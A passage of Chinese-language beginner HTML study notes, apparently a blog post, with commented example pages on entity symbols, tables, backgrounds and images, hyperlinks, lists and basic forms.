class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://postimg.cc/14zzHy98"><img src="https://i.postimg.cc/VsqbzNpW/2.png" alt="2.png"></a></p><h2 id="实体符号"><a href="#实体符号" class="headerlink" title="实体符号"></a>实体符号</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>实体符号<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--大于号和小于号可能和标签有冲突--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--b&lt;a&gt;c，而&lt;a&gt;s是链接--&gt;</span></span><br><span class="line">b<span class="symbol">&amp;lt;</span>a<span class="symbol">&amp;gt;</span>c<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--实体符号特点是：以&amp;开始，以;结束。&amp;lt;小于号,&amp;gt;大于号--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--加空格--&gt;</span></span><br><span class="line">avc    def<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">avc<span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span>def</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://postimg.cc/hXRgHnqb"><img src="https://i.postimg.cc/HkVx8WZK/3.png" alt="3.png"></a></p><h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>表格<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">borde=&quot;lpx&quot;设置表格的边框为1像素宽度。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="comment">&lt;!--让表格往下走--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>列表<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--表格先行(tr)后列(td)--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span> <span class="attr">border</span>=<span class="string">&quot;1px&quot;</span> <span class="attr">width</span>=<span class="string">&quot;50%&quot;</span> <span class="attr">height</span>=<span class="string">&quot;150px&quot;</span>&gt;</span><span class="comment">&lt;!--百分比设置可缩放--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--第一行--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--align对齐方式--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--三列--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>a<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>b<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>c<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--第二行--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>d<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span>e<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>f<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--第三行--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>x<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>y<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>z<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--单元格合并,以及th标签--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--注意事项</span></span><br><span class="line"><span class="comment">1、row合并的时候，删除下面的单元格</span></span><br><span class="line"><span class="comment">2、col合并的时候,对删除哪一个没有要求</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1px&quot;</span> <span class="attr">width</span>=<span class="string">&quot;50%&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--也是单元格标签，比&lt;td&gt;多的是居中加粗--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>员工编号<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>员工薪资<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>部门名称<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>a<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>b<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>c<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>d<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>e<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">rowspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span>f<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span>g<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">&lt;td&gt;h&lt;/td&gt;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">&lt;td&gt;i&lt;/td&gt;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--thead、tbody、tfoot 在table中不是必须的，但便于后期的js代码编写--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span> <span class="attr">border</span>=<span class="string">&quot;1px&quot;</span> <span class="attr">width</span>=<span class="string">&quot;50%&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">thead</span>&gt;</span> <span class="comment">&lt;!--头--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>员工编号<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>员工薪资<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>部门名称<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>ex1<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>ex1<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tbody</span>&gt;</span><span class="comment">&lt;!--体--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>a<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>b<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>c<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>ex2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tbody</span>&gt;</span><span class="comment">&lt;!--底--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tfoot</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>d<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>e<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>f<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>ex3<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>ex3<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tfoot</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://postimg.cc/z3LrvvzF"><img src="https://i.postimg.cc/qBwMm6WS/4.png" alt="4.png"></a></p><h2 id="背景色背景图和图片"><a href="#背景色背景图和图片" class="headerlink" title="背景色背景图和图片"></a>背景色背景图和图片</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span> <span class="comment">&lt;!--告诉浏览器以什么字符集打开当前页面</span></span><br><span class="line"><span class="comment">并不是设置当前页面的字符编码方式--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>背景颜色和背景图片<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">bgcolor</span>=<span class="string">&quot;red&quot;</span> <span class="attr">background</span>=<span class="string">&quot;E:\壁纸\测试.png&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--背景色位于背景图片下层--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;E:\壁纸\b.png&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100px&quot;</span> <span class="attr">title</span>=<span class="string">&quot;帕瓦&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;图片找不到了！&quot;</span> /&gt;</span><span class="comment">&lt;!--写成&lt;img src=&quot;..&quot; &gt;&lt;/img&gt;也可以&gt;</span></span><br><span class="line"><span class="comment">只设置宽度是高度会随着变(等比例)，只设置高度可能不管用</span></span><br><span class="line"><span class="comment">img标签就是图片标签</span></span><br><span class="line"><span class="comment">src属性是图片的路劲</span></span><br><span class="line"><span class="comment">title设置的时鼠标悬停时显示的信息</span></span><br><span class="line"><span class="comment">alt是用来设置图片加载失败时显示的信息</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/04/RVIahqstznSy4uJ.png" alt="1.png"></p><h2 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>超链接，热链接<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://youzipii.github.io&quot;</span>&gt;</span>博客<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="comment">&lt;!--文字超链接--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">href:hot references 热引用</span></span><br><span class="line"><span class="comment">href后面一定是一个资源的地址</span></span><br><span class="line"><span class="comment">也可以是本地的一个路径</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;file:///C:/Users/yxz/Desktop/%E8%83%8C%E6%99%AF%E9%A2%9C%E8%89%B2%E8%83%8C%E6%99%AF%E5%9B%BE%E7%89%87.html&quot;</span>&gt;</span>超链接 <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--超链接的特点</span></span><br><span class="line"><span class="comment">下划线</span></span><br><span class="line"><span class="comment">鼠标停留时会显示小手</span></span><br><span class="line"><span class="comment">点击超链接后能跳转页面</span></span><br><span class="line"><span class="comment">中间不一定要是文字，图片也可以</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://youzipii.github.io/&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;E:\壁纸\b.png&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100px&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="comment">&lt;!--图片超链接--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://youzipii.github.io&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>博客<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--_blank是在新标签页中打开如果是self则是在本标签中打开</span></span><br><span class="line"><span class="comment">_self当前窗口</span></span><br><span class="line"><span class="comment">_top顶级窗口</span></span><br><span class="line"><span class="comment">_parents父窗口</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--超链接的作用</span></span><br><span class="line"><span class="comment">通过超链接可以从浏览器向服务器发送请求</span></span><br><span class="line"><span class="comment">浏览器向服务器发送数据(请求：request)</span></span><br><span class="line"><span class="comment">服务器向浏览器发送数据(响应:reponse)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">B/S 结构的系统：每一个请求都会对应一个响应</span></span><br><span class="line"><span class="comment">B——请求——》S</span></span><br><span class="line"><span class="comment">S——响应——》B</span></span><br><span class="line"><span class="comment">用户点击超链接和直接书入URL有什么区别?</span></span><br><span class="line"><span class="comment">本质上没有，但超链接更方便</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>列表<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--有序列表--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ol</span> <span class="attr">type</span>=<span class="string">&quot;a&quot;</span>&gt;</span> <span class="comment">&lt;!-- 1 数字 A 大写字母 a 小写字母 i 希腊字母--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>水果</span><br><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>apple1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>apple2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>apple3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>蔬菜<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>甜点<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--无序列表--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">type</span>=<span class="string">&quot;circle&quot;</span>&gt;</span><span class="comment">&lt;!--circle 圈圈 disc 方块 square点点--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>apple</span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>apple 3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>apple 2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>apple 1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>banana<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>grape<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>表单form<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">1、表单有什么用？</span></span><br><span class="line"><span class="comment">收集用户信息</span></span><br><span class="line"><span class="comment">表单展现之后，用户填写表单，点击提交后提交数据给服务器</span></span><br><span class="line"><span class="comment">2、怎么画一个表单呢？</span></span><br><span class="line"><span class="comment">使用form标签</span></span><br><span class="line"><span class="comment">3、一个网页当中可以有多个表单</span></span><br><span class="line"><span class="comment">4、表单最终需要提交数据给服务器。</span></span><br><span class="line"><span class="comment">form标签有一个action属性，这个属性用来指定服务器地址</span></span><br><span class="line"><span class="comment">action属性和超链接的href属性一样，都可以向服务器发送请求（request）</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://192.199.177:8080/oa/save&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;注册&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;设置按钮上得文本&quot;</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!--对于按钮来说value用于指定按钮的文本信息--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--传给这个机器上8080端口的软件--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--画一个提交(suibmit)按钮可以使用input输入域,type = &quot;input&quot;,此时按钮具有提交表单的能力，空着的是普通按钮，没有提交能力。--&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 笔记</span></span><br><span class="line"><span class="comment">在用sublime的自动补全时，input标签补全的是type和name 而没有</span></span><br><span class="line"><span class="comment">value</span></span><br><span class="line"><span class="comment">搜索资料name指的是控件的名称,即文本框的名称，而在type 为submit时更改name并不能改变按钮上的字，得改变value得值，</span></span><br><span class="line"><span class="comment">value是指文字域得默认取值，用于定于文本框（中）得默认值</span></span><br><span class="line"><span class="comment">说明submit得默认值是提交.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">还有在自动补全时并没有补充/ 但浏览器也能识别不会报错，但写上更规范</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">超链接和表单都能向服务器发送请求，但表单可以携带数据</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">按钮要放到表单标签内部才能有作用</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">没有name时不会提交的</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://www.baidu.com&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span 